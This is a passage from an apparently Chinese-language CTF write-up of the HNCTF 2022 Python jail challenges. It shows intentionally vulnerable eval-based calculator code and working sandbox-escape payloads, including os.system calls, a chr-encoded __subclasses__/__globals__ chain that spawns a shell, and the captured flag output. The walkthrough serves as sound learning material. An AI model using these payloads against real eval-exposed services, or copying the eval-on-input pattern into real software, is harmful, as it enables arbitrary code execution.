&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Try to eval the code first.</span></span><br><span class="line">            result = <span class="built_in">eval</span>(code, global_namespace, local_namespace)</span><br><span class="line">        <span class="keyword">except</span> SyntaxError:</span><br><span class="line">            <span class="comment"># If a SyntaxError occurs, this might be because the user entered a statement,</span></span><br><span class="line">            <span class="comment"># in which case we should use exec.</span></span><br><span class="line">            <span class="built_in">exec</span>(code, global_namespace, local_namespace)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    repl() </span><br></pre></td></tr></table></figure>
<h3 id="HNCTF-2022-Pyjail题目复现">HNCTF 2022 Pyjail题目复现</h3>
<h4 id="calc-jail-beginner">calc_jail_beginner</h4>
<p>It’s an great way to learn an python jail from these challenge!</p>
<p>Let’s play it.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Your goal is to read ./flag.txt</span></span><br><span class="line"><span class="comment">#You can use these payload liked `__import__(&#x27;os&#x27;).system(&#x27;cat ./flag.txt&#x27;)` or `print(open(&#x27;/flag.txt&#x27;).read())`</span></span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _     ______      _                              _       _ _ </span></span><br><span class="line"><span class="string"> | |   |  ____|    (_)                            | |     (_) |</span></span><br><span class="line"><span class="string"> | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |</span></span><br><span class="line"><span class="string"> | &#x27;_ \|  __| / _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|  _   | |/ _` | | |</span></span><br><span class="line"><span class="string"> | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |</span></span><br><span class="line"><span class="string"> |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|</span></span><br><span class="line"><span class="string">               __/ |                                           </span></span><br><span class="line"><span class="string">              |___/                                            </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
<p>注意到这里用到了一个<code>eval(input_data)</code>，这个函数会将我们的输入转换并且执行python代码（类似的有<code>exec()</code>）。</p>
<p>这NSSCTF部署的题目复现根据提示去打payload并没有找到题目所说的flag，直接ls查看一下文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  _     ______      _                              _       _ _</span><br><span class="line"> | |   |  ____|    (_)                            | |     (_) |</span><br><span class="line"> | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |</span><br><span class="line"> | <span class="string">&#x27;_ \|  __| / _` | | &#x27;</span>_ \| <span class="string">&#x27;_ \ / _ \ &#x27;</span>__|  _   | |/ _` | | |</span><br><span class="line"> | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |</span><br><span class="line"> |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|</span><br><span class="line">               __/ |</span><br><span class="line">              |___/</span><br><span class="line"></span><br><span class="line">Welcome to the python jail</span><br><span class="line">Let<span class="string">&#x27;s have an beginner jail of calc</span></span><br><span class="line"><span class="string">Enter your expression and I will evaluate it for you.</span></span><br><span class="line"><span class="string">&gt; __import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span><span class="built_in">ls</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">flag  server.py</span></span><br><span class="line"><span class="string">Answer: 0</span></span><br></pre></td></tr></table></figure>
<p>发现flag文件就叫flag，那么可以构造以下payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>).read())</span><br><span class="line">plaintext</span><br><span class="line">&gt; <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>).read())</span><br><span class="line">flag=NSSCTF&#123;0ff598a9-c835-4c4c-b113-35b0b476d239&#125;</span><br><span class="line"></span><br><span class="line">Answer: <span class="literal">None</span></span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level1">calc_jail_beginner_level1</h4>
<p>you finish beginner challenge.Let’s play an challenge of easy calc</p>
<p>It seems have some filter than beginner challenge. can u escape it?</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#the function of filter will banned some string &#x27;,&quot;,i,b</span></span><br><span class="line"><span class="comment">#it seems banned some payload </span></span><br><span class="line"><span class="comment">#Can u escape it?Good luck!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`ib&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ __ </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | /_ |</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|</span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                  </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                      </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
<p>还是类似的题目，但是多了一个过滤：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`ib&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br></pre></td></tr></table></figure>
<p>不能包含双引号单引号反引号、还有字母i和b。所以<code>import</code>和<code>bytes</code>就不能用了。</p>
<p>在RCE中，首先使用Show subclasses with tuple起手：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>
<p>这种操作可以得到tuple所属类的直接基类的所有子类，事实上，根据我们之前得到的特性，这里我们求得的<code>().__class__.__base__</code>其实就是<code>&lt;class 'object'&gt;</code>，所以求得是object类的所有子类。</p>
<p>但是我们不能出现字母b，可以使用getattr函数替代<code>__base__</code>：</p>
<blockquote>
<p>使用方法大致可以抽象为<code>getattr(A,'B')</code>等价于<code>A.B</code>，同样的：<code>getattr(A,'B')()</code>等价于<code>A.B()</code>。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(().__class__, <span class="string">&#x27;__base__&#x27;</span>).__subclasses__()</span><br></pre></td></tr></table></figure>
<p>转成字符串之后，由于不让出现引号，可以进一步转换成用<code>chr</code>加和表示字符串的形式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(().__class__, <span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)).__subclasses__()</span><br></pre></td></tr></table></figure>
<p>同样的方法可以改后面的<code>__subclasses__()</code>，得到payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">getattr</span>(().__class__,<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)),<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">117</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>))()</span><br><span class="line">plaintext</span><br><span class="line">Welcome to the python jail</span><br><span class="line">Let<span class="string">&#x27;s have an beginner jail of calc</span></span><br><span class="line"><span class="string">Enter your expression and I will evaluate it for you.</span></span><br><span class="line"><span class="string">&gt; getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()</span></span><br><span class="line"><span class="string">Answer: [&lt;class &#x27;</span><span class="built_in">type</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>async_generato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">int</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>bytearray_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">bytearray</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>bytes_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">bytes</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>builtin_function_or_method<span class="string">&#x27;&gt;, &lt;class &#x27;</span>callable_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>PyCapsule<span class="string">&#x27;&gt;, &lt;class &#x27;</span>cell<span class="string">&#x27;&gt;, &lt;class &#x27;</span>classmethod_descripto<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">classmethod</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>code<span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">complex</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>coroutine<span class="string">&#x27;&gt;, &lt;class &#x27;</span>dict_items<span class="string">&#x27;&gt;, &lt;class &#x27;</span>dict_itemiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>dict_keyiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>dict_valueiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>dict_keys<span class="string">&#x27;&gt;, &lt;class &#x27;</span>mappingproxy<span class="string">&#x27;&gt;, &lt;class &#x27;</span>dict_reverseitemiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>dict_reversekeyiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>dict_reversevalueiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>dict_values<span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">dict</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>ellipsis<span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">enumerate</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">float</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>frame<span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">frozenset</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>function<span class="string">&#x27;&gt;, &lt;class &#x27;</span>generato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>getset_descripto<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>instancemethod<span class="string">&#x27;&gt;, &lt;class &#x27;</span>list_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>list_reverseiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">list</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>longrange_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>member_descripto<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">memoryview</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>method_descripto<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>method<span class="string">&#x27;&gt;, &lt;class &#x27;</span>modulede<span class="string">f&#x27;&gt;, &lt;class &#x27;</span>module<span class="string">&#x27;&gt;, &lt;class &#x27;</span>odict_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>pickle.PickleBuffe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">property</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>range_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">range</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">reversed</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>symtable entry<span class="string">&#x27;&gt;, &lt;class &#x27;</span>iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>set_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">set</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">slice</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">staticmethod</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>stderrprinte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>supe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>traceback<span class="string">&#x27;&gt;, &lt;class &#x27;</span>tuple_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">tuple</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>str_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>st<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>wrapper_descripto<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>types.GenericAlias<span class="string">&#x27;&gt;, &lt;class &#x27;</span>anext_awaitable<span class="string">&#x27;&gt;, &lt;class &#x27;</span>async_generator_asend<span class="string">&#x27;&gt;, &lt;class &#x27;</span>async_generator_athrow<span class="string">&#x27;&gt;, &lt;class &#x27;</span>async_generator_wrapped_value<span class="string">&#x27;&gt;, &lt;class &#x27;</span>coroutine_wrappe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>InterpreterID<span class="string">&#x27;&gt;, &lt;class &#x27;</span>managedbuffe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>method-wrappe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>types.SimpleNamespace<span class="string">&#x27;&gt;, &lt;class &#x27;</span>NoneType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>NotImplementedType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>weakref.CallableProxyType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>weakref.ProxyType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>weakref.ReferenceType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>types.UnionType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>EncodingMap<span class="string">&#x27;&gt;, &lt;class &#x27;</span>fieldnameiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>formatteriterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>BaseException<span class="string">&#x27;&gt;, &lt;class &#x27;</span>hamt<span class="string">&#x27;&gt;, &lt;class &#x27;</span>hamt_array_node<span class="string">&#x27;&gt;, &lt;class &#x27;</span>hamt_bitmap_node<span class="string">&#x27;&gt;, &lt;class &#x27;</span>hamt_collision_node<span class="string">&#x27;&gt;, &lt;class &#x27;</span>keys<span class="string">&#x27;&gt;, &lt;class &#x27;</span>values<span class="string">&#x27;&gt;, &lt;class &#x27;</span>items<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_contextvars.Context<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_contextvars.ContextVa<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_contextvars.Token<span class="string">&#x27;&gt;, &lt;class &#x27;</span>Token.MISSING<span class="string">&#x27;&gt;, &lt;class &#x27;</span>filte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">map</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">zip</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib._ModuleLock<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib._DummyModuleLock<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib._ModuleLockManage<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib.ModuleSpec<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib.BuiltinImporte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib.FrozenImporte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib._ImportLockContext<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_thread.lock<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_thread.RLock<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_thread._localdummy<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_thread._local<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_io._IOBase<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_io._BytesIOBuffe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_io.IncrementalNewlineDecode<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>posix.ScandirIterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>posix.DirEntry<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib_external.WindowsRegistryFinde<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib_external._LoaderBasics<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib_external.FileLoade<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib_external._NamespacePath<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib_external._NamespaceLoade<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib_external.PathFinde<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib_external.FileFinde<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>codecs.Codec<span class="string">&#x27;&gt;, &lt;class &#x27;</span>codecs.IncrementalEncode<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>codecs.IncrementalDecode<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>codecs.StreamReaderWrite<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>codecs.StreamRecode<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_abc._abc_data<span class="string">&#x27;&gt;, &lt;class &#x27;</span>abc.ABC<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.Hashable<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.Awaitable<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.AsyncIterable<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.Iterable<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.Sized<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.Containe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>collections.abc.<span class="type">Callable</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>os._wrap_close<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_sitebuiltins.Quitte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_sitebuiltins._Printe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_sitebuiltins._Helpe<span class="string">r&#x27;&gt;]</span></span><br></pre></td></tr></table></figure>
<p>在得到的这么多子类中找到了<code> &lt;class 'os._wrap_close'&gt;</code>，下一步就是利用这个子类：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>.__init__</code> 获取所选子类的构造函数 <code>__init__</code> 方法。</p>
<p><code>.__globals__</code> 获取 <code>__init__</code> 方法的全局命名空间，这通常<strong>包含了可用的所有全局变量和函数</strong>。</p>
</blockquote>
<p>同样用<code>getattr</code>绕过<code>__init__</code>和<code>__globals__</code>，以及改写字符串操作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(().__class__,chr(<span class="number">95</span>)+chr(<span class="number">95</span>)+chr(<span class="number">98</span>)+chr(<span class="number">97</span>)+chr(<span class="number">115</span>)+chr(<span class="number">101</span>)+chr(<span class="number">95</span>)+chr(<span class="number">95</span>)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))</span><br><span class="line">plaintext</span><br><span class="line">Enter your expression and I will evaluate it <span class="keyword">for</span> you.</span><br><span class="line">&gt; getattr(getattr(getattr(getattr(().__class__,chr(<span class="number">95</span>)+chr(<span class="number">95</span>)+chr(<span class="number">98</span>)+chr(<span class="number">97</span>)+chr(<span class="number">115</span>)+chr(<span class="number">101</span>)+chr(<span class="number">95</span>)+chr(<span class="number">95</span>)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))</span><br><span class="line">sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">flag  server.py</span></span><br><span class="line"><span class="string">$ cat flag</span></span><br><span class="line"><span class="string">flag=NSSCTF&#123;00711634-832d-437e-be7a-d98793070bdc&#125;</span></span><br></pre></td></tr></table></figure>
<p>得到flag。</p>
<p>实际上，如果我们已知题目文件叫flag，可以用<code>chr</code>和<code>open</code>操作直接读：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">chr</span>(<span class="number">102</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">103</span>)).read())</span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level2">calc_jail_beginner_level2</h4>
<p>you finish beginner challenge level1.Let’s play an challenge of level2</p>
<p>Now that the length is limited, can u escape this jail?</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#the length is be limited less than 13</span></span><br><span class="line"><span class="comment">#it seems banned some payload </span></span><br><span class="line"><span class="comment">#Can u escape it?Good luck!</span></span><br><span 